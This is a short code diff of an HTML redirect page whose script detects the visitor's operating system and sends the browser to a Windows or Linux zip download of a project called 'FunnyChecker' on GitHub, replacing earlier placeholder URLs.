@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Перенаправление...</title>
+    <title>Перенаправление</title>
 </head>
 <body>
     <script>
@@ -16,12 +16,10 @@
             }
             return 'other';
         }
-
         const links = {
-            windows: 'https://win.coom',
-            other: 'https://lin.com'
+            windows: 'https://github.com/ytikaNTP/FunnyChecker/releases/download/Realese1.0/Windows.zip',
+            other: 'https://github.com/ytikaNTP/FunnyChecker/releases/download/Realese1.0/Linux.zip'
         };
-
         const os = getOS();
         window.location.href = links[os];
     </script>
